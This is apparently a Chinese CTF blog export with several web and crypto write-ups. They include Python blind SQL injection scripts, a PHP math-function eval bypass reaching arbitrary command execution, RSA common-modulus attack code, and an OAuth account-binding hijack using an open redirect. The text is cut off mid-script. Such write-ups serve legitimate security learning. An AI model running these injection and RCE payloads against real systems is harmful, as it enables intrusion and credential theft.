<p>当前面的判断条件为假时，数据库就不会执行后面的pow函数，否则就会执行，当pow参数为pow（9,99999999）时，就会因为数字过大而报错，于是利用这一点构造注入语句对数据库名进行暴破<br><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-425c3dd250d095c4.png" alt></p>
<p>得到的数据库名为ctf，然后由于or被过滤，无法查看information_schema，但是可以猜出表名为user，测试后确定用户名为admin，所以既然不能够直接爆出flag那就暴破出密码登入进行查看，构造脚本进行爆破</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">result = ''</span><br><span class="line">url = 'http://728b6208b313404eba7b7712cc1c3aa203c6e16dcc7a4425.changame.ichunqiu.com/'</span><br><span class="line"><span class="comment">#payload = 'no=1 or if((ascii(substr((&#123;sql&#125;),&#123;list&#125;,1))=&#123;num&#125;),1,0)'</span></span><br><span class="line"><span class="comment">#payload = '''a' and ascii(mid(&#123;sql&#125;,&#123;list&#125;,1))=&#123;num&#125; and pow(9,9999999999)#'''</span></span><br><span class="line">payload = "a' &amp;&amp; (<span class="keyword">select</span> * <span class="keyword">from</span> ctf.user <span class="keyword">limit</span> <span class="number">1</span>) &gt; (<span class="string">'admin'</span>,<span class="string">'&#123;password&#125;'</span>) &amp;&amp; <span class="keyword">pow</span>(<span class="number">9</span>,<span class="number">9999999999</span>)<span class="comment">#"</span></span><br><span class="line"><span class="comment">#cookies = &#123;'PHPSESSID':'15lkeifat78j9p81p7k0igq7n2'&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">password</span> = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="comment">#hh = payload.format(sql='database()',list=str(i),num=str(j)) #ctf</span></span><br><span class="line">        hh = payload.format(<span class="keyword">password</span> = <span class="keyword">str</span>(<span class="keyword">password</span> + <span class="keyword">chr</span>(j))) <span class="comment">#ctf</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql="select table_name from information_schema.tables where table_schema='ctf'",list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select * from ctf.f14g',list=str(i),num=str(j))</span></span><br><span class="line">        print hh</span><br><span class="line">        <span class="keyword">data</span> = &#123;<span class="string">'username'</span>:hh,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">        <span class="comment">#print hh</span></span><br><span class="line">        try:</span><br><span class="line">            zz = requests.post(<span class="keyword">url</span>,<span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">            <span class="comment">#print zz.content</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'数据库操作失败'</span> <span class="keyword">in</span> zz.content:</span><br><span class="line">                pass</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">password</span> += <span class="keyword">chr</span>(j<span class="number">-1</span>)</span><br><span class="line">                print <span class="keyword">password</span></span><br><span class="line">                break</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            continue</span><br></pre></td></tr></table></figure>

<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-5d13e6227a9b2ad1.png" alt></p>
<p>但是这中写法是判断不出大小写的，尝试修改判断大小写后，爆出密码为：F1AG@1s-at_/fll1llag_h3r3，使用用户名密码登陆进去竟然还有一层</p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-4076f8ade257663a.png" alt></p>
<p>看到这个“你可以在这里对远程数据库进行操作”，于是想到最近的一个mysql的安全问题：Rogue-MySql-Server，并且最近的DDCTF也出了这个问题的题目。并且github上mysqlserver伪造的项目：<a href="https://github.com/Gifts/Rogue-MySql-Server，在vps上跑脚本即可，并且上面得到的密码也有暗示，flag在文件fll1llag_h3r3中，查看下mysql.log。" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server，在vps上跑脚本即可，并且上面得到的密码也有暗示，flag在文件fll1llag_h3r3中，查看下mysql.log。</a></p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-5abe785bea01fa71.png" alt></p>
<p><strong>FLAG值：</strong>flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade}</p>
<h3 id="0x02-love-math"><a href="#0x02-love-math" class="headerlink" title="0x02 love math"></a>0x02 love math</h3><p>这题真的做了一天，到最后这题只有50多分了，真的是在下老了。<br>最开始发现可以计算还以为以为是SSTI……，查看网页源码可以拿到calc.php文件的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反正该ban的都ban了，也就是没法直接绕过正则，这题的意思就很明显了，就是需要应用给的math函数来进行构造，函数内的参数不可出现一些特殊字符和英文字符，查看官方文档可以发现base_convert可以进行2到36进制间的转换，所以最开始的思路是利用base_convert将payload进行进制转化，即转换为自由数字的字符串就行，即可构造出任意函数，构造system(ls)进行测试。<br>利用payload：base_convert(1751504350,10,36)(base_convert(784,10,36))，列出/html/根目录，看到目录列出来的时候大喜，感觉一血就在眼前，然后gg了。<br>由于特殊字符无法进行36进制和10进制间的转换，所以想要直接按前面的payload构造system(cat f*)是不可能的，后来是将exec(cat f*)中的‘cat f*’转换为16进制，再转换为10进制，利用dechex函数和hex2bin函数进行还原，hex2bin利用base_convert转换为10进制，就这个地方卡死了，因为80位长度的限制，我最短也就构造了81位，真的是难受。<br>刚好之前有接触过rand^(x).(x)的操作，通过异或可以构造出大写英文字符，所以想着能不能拼接一个$_GET或者$_POST出来，就不要考虑代码里的限制了，最终利用rand^(7).(5)构造出了’ET’，用is_nan^(6).(4)构造出了’_G’,在拼接起来就构造出了_GET，思路就是将$content构造为$_GET[a]( $_GET[b]),a参数构造为system函数，b参数当作system函数的参数，即可绕过限制，执行任意命令。关键是将_GET构造成$_GET函数，在本地配置测试环境</p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-a3f096398526363b.png" alt></p>
<p>构造payload：<a href="http://192.168.44.129/web2.php?c=2333;\$_GET%5ba%5d(\$_GET%5bb%5d)&amp;a=system&amp;b=ls" target="_blank" rel="noopener">http://192.168.44.129/web2.php?c=2333;\$_GET%5ba%5d(\$_GET%5bb%5d)&amp;a=system&amp;b=ls</a><br><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-43ae652631f185cb.png" alt></p>
<p>所以接下主要要解决的就是构造$_GET，正则上不会过滤MATH函数名、大括号等，所以可以利用这点用来构造变量覆盖来从而构造payload，其中中括号[]可以用大括号替代，最终构造：$cos=(is_nan^(6).(4)).(rand^(7).(5));$$cos{atan}($$cos{atanh})，即$cos=’_GET’,$$cos覆盖后为$_GET,所以通过变量覆盖后最终为$_GET{atan}($_GET{atanh}),所以直接给参数atan和atanh赋值，可以实现任意代码执行，最终构造：2333333;$cos=(is_nan^(6).(4)).(rand^(7).(5));$$cos{atan}($$cos{atanh})&amp;atan=system&amp;atanh=cat flag.php，其中2333333;用于闭合echo，不过不闭合也可以的，便可得到flag。<br>后来继续测试了一下，发现利用exec(nl *)进行缩短竟然可以缩到79位（吐血）！！！……这里直接贴缩的payload：base_convert(47138,20,36)(base_convert(1438255411,14,34)(dechex(474260465194)))，其中hex2bin进行14/34进制的转换，exec进行20/36进制的转换就可以达到79位。<br>这道题的解法比较多，比如在构造$cos=(is_nan^(6).(4)).(rand^(7).(5));$$cos{atan}($$cos{atanh})时，$$cos{atan}可以直接利用base_convert函数将system或者eval进行10/36进制转换进行利用。<br>如果没有过滤反引号，其实会简单很多，可以参考P神的：<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">无字母数字Webshell之提高篇 </a>闭合前一段&lt;?php，利用&lt;?=开辟代码，通过’`. /???/???/????/????.????`‘来打印文件内容，详细的可以本地测试调试不做过多说明。</p>
<p><strong>FLAG值：</strong>flag{86fed0d1-42ec-46ba-83ee-7dedd09303fb}</p>
<h3 id="0x03-RefSpace"><a href="#0x03-RefSpace" class="headerlink" title="0x03 RefSpace"></a>0x03 RefSpace</h3><p>路走错了，跑去逆向文件了。这个还是等大佬的wp了</p>
<h6 id="个人觉得Web没那么简单，被刷到两位数的分有点意外到，不多说。"><a href="#个人觉得Web没那么简单，被刷到两位数的分有点意外到，不多说。" class="headerlink" title="个人觉得Web没那么简单，被刷到两位数的分有点意外到，不多说。"></a>个人觉得Web没那么简单，被刷到两位数的分有点意外到，不多说。</h6>]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>RCE</tag>
        <tag>反序列化</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>2018 X-NUCA Cyc1e_writeup</title>
    <url>/2018/11/26/2018X-NUCA-Cyc1e-writeup/</url>
    <content><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="Warm-Up"><a href="#Warm-Up" class="headerlink" title="Warm Up"></a>Warm Up</h3><p>分析流量包，一共包含六组RSA的交互信息，copy出来对比有两组的n是相同的</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">This is a message distribute system. Please tell me your name: </span><br><span class="line">Dave</span><br><span class="line">Hi Dave, your N is: 25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span><br><span class="line"><span class="keyword">And</span> your exponent is: 6947</span><br><span class="line">Last but <span class="keyword">not</span> least, your<span class="built_in"> secret </span>is: 20494665879116666159961016125949070097530413770391893858215547229071116025581822729798313796823204861624912909030975450742122802775879194445232064367771036011021366123393917354134849911675307877324103834871288513274457941036453477034798647182106422619504345055259543675752998330786906376830335403339610903547255965127196315113331300512641046933227008101401416026809256813221480604662012101542846479052832128788279031727880750642499329041780372405567816904384164559191879422615238580181357183882111249939492668328771614509476229785062819586796660370798030562805224704497570446844131650030075004901216141893420140140568</span><br><span class="line">You will know the<span class="built_in"> secret </span>after I give you P,Q.</span><br><span class="line">See you next time!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This is a message distribute system. Please tell me your name: </span><br><span class="line">Alice</span><br><span class="line">Hi Alice, your N is: 25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span><br><span class="line"><span class="keyword">And</span> your exponent is: 7669</span><br><span class="line">Last but <span class="keyword">not</span> least, your<span class="built_in"> secret </span>is: 22917655888781915689291442748409371798632133107968171254672911561608350738343707972881819762532175014157796940212073777351362314385074785400758102594348355578275080626269137543136225022579321107199602856290254696227966436244618441350564667872879196269074433751811632437228139470723203848006803856868237706401868436321225656126491701750534688966280578771996021459620472731406728379628286405214996461164892486734170662556518782043881759918394674517409304629842710180023814702447187081112856416034885511215626693534876901484105593275741829434329109239483368867518384522955176807332437540578688867077569728548513876841471</span><br><span class="line">You will know the<span class="built_in"> secret </span>after I give you P,Q.</span><br><span class="line">See you next time!</span><br></pre></td></tr></table></figure>

<p>一个常规的RSA共模攻击，代码如下</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="attr">from</span> <span class="string">libnum import n2s,s2n</span></span><br><span class="line"><span class="attr">from</span> <span class="string">gmpy2 import invert</span></span><br><span class="line"><span class="attr">def</span> <span class="string">egcd(a, b):</span></span><br><span class="line">  <span class="attr">if</span> <span class="string">a == 0:</span></span><br><span class="line">    <span class="attr">return</span> <span class="string">(b, 0, 1)</span></span><br><span class="line">  <span class="attr">else</span>:<span class="string"></span></span><br><span class="line">    <span class="meta">g,</span> <span class="string">y, x = egcd(b % a, a)</span></span><br><span class="line">    <span class="attr">return</span> <span class="string">(g, x - (b // a) * y, y)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">def</span> <span class="string">main():</span></span><br><span class="line">  <span class="attr">n</span> = <span class="string">25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span></span><br><span class="line">  <span class="attr">c1</span> = <span class="string">20494665879116666159961016125949070097530413770391893858215547229071116025581822729798313796823204861624912909030975450742122802775879194445232064367771036011021366123393917354134849911675307877324103834871288513274457941036453477034798647182106422619504345055259543675752998330786906376830335403339610903547255965127196315113331300512641046933227008101401416026809256813221480604662012101542846479052832128788279031727880750642499329041780372405567816904384164559191879422615238580181357183882111249939492668328771614509476229785062819586796660370798030562805224704497570446844131650030075004901216141893420140140568</span></span><br><span class="line">  <span class="attr">c2</span> = <span class="string">22917655888781915689291442748409371798632133107968171254672911561608350738343707972881819762532175014157796940212073777351362314385074785400758102594348355578275080626269137543136225022579321107199602856290254696227966436244618441350564667872879196269074433751811632437228139470723203848006803856868237706401868436321225656126491701750534688966280578771996021459620472731406728379628286405214996461164892486734170662556518782043881759918394674517409304629842710180023814702447187081112856416034885511215626693534876901484105593275741829434329109239483368867518384522955176807332437540578688867077569728548513876841471</span></span><br><span class="line">  <span class="attr">e1</span> = <span class="string">6947</span></span><br><span class="line">  <span class="attr">e2</span> = <span class="string">7669</span></span><br><span class="line">  <span class="attr">s</span> = <span class="string">egcd(e1, e2)</span></span><br><span class="line">  <span class="attr">s1</span> = <span class="string">s[1]</span></span><br><span class="line">  <span class="attr">s2</span> = <span class="string">s[2]</span></span><br><span class="line">  <span class="attr">if</span> <span class="string">s1&lt;0:</span></span><br><span class="line">    <span class="attr">s1</span> = <span class="string">- s1</span></span><br><span class="line">    <span class="attr">c1</span> = <span class="string">invert(c1, n)</span></span><br><span class="line">  <span class="attr">elif</span> <span class="string">s2&lt;0:</span></span><br><span class="line">    <span class="attr">s2</span> = <span class="string">- s2</span></span><br><span class="line">    <span class="attr">c2</span> = <span class="string">invert(c2, n)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">m</span> = <span class="string">pow(c1,s1,n)*pow(c2,s2,n) % n</span></span><br><span class="line">  <span class="attr">print</span> <span class="string">n2s(m)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">if</span> <span class="string">__name__ == '__main__':</span></span><br><span class="line">  <span class="attr">main()</span></span><br></pre></td></tr></table></figure>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h3><p>题目提示了第三方登入认证方式是OAuth2.0的，OAuth2.0存在一个快捷登录授权劫持问题，主要在于code变量，然后就入坑了，最开始的思路是让admin访问快捷登入页面，修改redirect_uri 来抓取重置的code，然后伪造admin用户登入，然后发现redirect_uri不可伪造，就自闭了（具体分析可以看：<a href="https://bbs.ichunqiu.com/thread-34168-1-1.html）。本题的主要利用点在于帐号可重复绑定不同的第三方邮箱，所以让admin绑定上我们注册的邮箱，通过第三方邮箱登入admin帐号即可得到flag。通过/main/register注册一个用户，register需要探测一下" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-34168-1-1.html）。本题的主要利用点在于帐号可重复绑定不同的第三方邮箱，所以让admin绑定上我们注册的邮箱，通过第三方邮箱登入admin帐号即可得到flag。通过/main/register注册一个用户，register需要探测一下</a></p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-35fe46782118d653.png" alt><br>第三方登入方式注册一个邮箱帐号用来绑定，通过绑定第三方邮箱，截取绑定的流量包</p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-901058431549ca2d.png" alt></p>
<p>绑定第三方邮箱主要通过state和code进行认证，即只要state和code正确，即可绑定成功，并不校验绑定的账户是什么，从而可以达到绑定其他用户并覆盖绑定邮箱的目的，所以我们可以让admin用户去访问Url：<a href="http://106.75.66.211:8000/main/oauth/?state=svFglsaloQ&code=AoWZd4NJLHuVomqQn2hWoDAp6hP6nz03VqDbp6sa" target="_blank" rel="noopener">http://106.75.66.211:8000/main/oauth/?state=svFglsaloQ&amp;code=AoWZd4NJLHuVomqQn2hWoDAp6hP6nz03VqDbp6sa</a> 便可以达到让admin帐号绑定上我们邮箱的效果，并且后台设置了bot，所以我们可以通过post_bug提交绑定的Url来让admin访问，由于提交框有长度限制，所以直接提交是没有办法的。</p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-1d2bf17a7627737b.png" alt></p>
<p>由于<a href="http://106.75.66.211:8000/main/login?next=/main/login" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=/main/login</a> 处存在重定向，所以我们可以通过重定向跳转到vps上，即<a href="http://106.75.66.211:8000/main/login?next=[your_ip]" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=[your_ip]</a> 在vps上写一个跳转页面</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.open(<span class="string">'http://106.75.66.211:8000/main/oauth/?state=9PKyRdpU5D&amp;code=Y5WjDdELjUMGaJpbYfs9lOPBtgEvrOOvZxmmwZsj'</span>)</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将vps跳转页面地址压缩成短链（ 推荐个短链生成地址：<a href="https://bitly.com" target="_blank" rel="noopener">https://bitly.com</a> ），提交bug，最终提交Url为：<a href="http://106.75.66.211:8000/main/login?next=https://bit.ly/2Qiixxx" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=https://bit.ly/2Qiixxx</a> 等待bot访问后利用第三方邮箱登入</p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-fb8e409e2de06be0.png" alt></p>
<h3 id="ezdotso"><a href="#ezdotso" class="headerlink" title="ezdotso"></a>ezdotso</h3><p>题目配置问题，上手甩一个cat /flag就出了，我和小伙伴都惊呆了。?action=cmd&amp;cmd=ls%20/ 列根目录，flag在根目录下<br><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-bc74376afd02b60f.png" alt></p>
<p>?action=cmd&amp;cmd=cat%20/flag出奇迹……<br><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-f9fee2030f214445.png" alt></p>
<h5 id="ps-其他几个web都比较难，怼到自闭，最后ROIS出了hardphp，还有js-wasm和web-pwn的，又可以学习一波了。"><a href="#ps-其他几个web都比较难，怼到自闭，最后ROIS出了hardphp，还有js-wasm和web-pwn的，又可以学习一波了。" class="headerlink" title="ps:其他几个web都比较难，怼到自闭，最后ROIS出了hardphp，还有js+wasm和web+pwn的，又可以学习一波了。"></a>ps:其他几个web都比较难，怼到自闭，最后ROIS出了hardphp，还有js+wasm和web+pwn的，又可以学习一波了。</h5>]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>Crypto</tag>
        <tag>OAuth2.0</tag>
      </tags>
  </entry>
  <entry>
    <title>2018高校网络信息安全管理运维挑战赛Web_Writeup</title>
    <url>/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>emmmm，很久没有好好的打比赛了，基本都是滑水，认真打的时候又被一些脑洞卡一天，难受，这次的题比较简单，所以Writeup也就简单些写了，可惜不会逆向，不然应该有那么点可能AK吧。</p>
<h3 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h3><p>一个普通的BBS，进去随手在登入框输了个‘ ‘ ’就报错了，直接把SQL语句都爆出来了</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f0e585b5e166c7dd.png" alt><br>甩sqlmap爆破，爆破的时候把level设置高一些，很多问我怎么他们没爆出来，应该就是因为level的原因吧。flag放在bbs库flag表flag字段里。</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3da046af8ea5f69d.png" alt></p>
<h3 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h3><p>这道题目很明显是二次注入，由于很讨厌写注入的题，所以也是很后面才写，主要逻辑在于注册用户时我们插入SQL查询语句，登入后也在主页面提示分数为0什么的信息，所以在Final Exam页面测试，如果返回值显示的分数为非0，那么则表示注入的查询语句查询正确，若返回显示的分数为0，则说明查询失败，所以典型的盲注了，构造payload：’ or if((ascii(substr((select flag from flag),1,1))=1),1,0)=’1’ or ‘ 作为注册用户名，这里坑了一下，刚开始用的是 and，在insert的时候 and 和 &amp;&amp; 不会当作逻辑运算符执行，所以用 or 或者 || ，写个盲注脚本就好了。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">url = <span class="string">'http://210.32.4.20/register.php'</span></span><br><span class="line">url_2 = <span class="string">'http://210.32.4.20/login.php'</span></span><br><span class="line">url_3 = <span class="string">'http://210.32.4.20/answer.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(32,126):</span><br><span class="line">		<span class="attribute">ss</span>=requests.session()</span><br><span class="line">		payload = <span class="string">"\' or if((ascii(substr((select flag from flag),"</span> + str(i) + <span class="string">",1))="</span> + str(j) + <span class="string">"),1,0)='1' or \'"</span></span><br><span class="line">		post_an = &#123;<span class="string">'1.a'</span>:<span class="string">'on'</span>&#125;</span><br><span class="line">		post_data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">		r = ss.post(<span class="attribute">url</span>=url,data=post_data)</span><br><span class="line">		login = ss.post(<span class="attribute">url</span>=url_2,data=post_data)</span><br><span class="line">		an = ss.post(<span class="attribute">url</span>=url_3,data=post_an)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'Your grades is 0'</span> <span class="keyword">not</span> <span class="keyword">in</span> an.content:</span><br><span class="line">			e = chr(j)</span><br><span class="line">			result = result + e</span><br><span class="line">			<span class="builtin-name">print</span> result</span><br><span 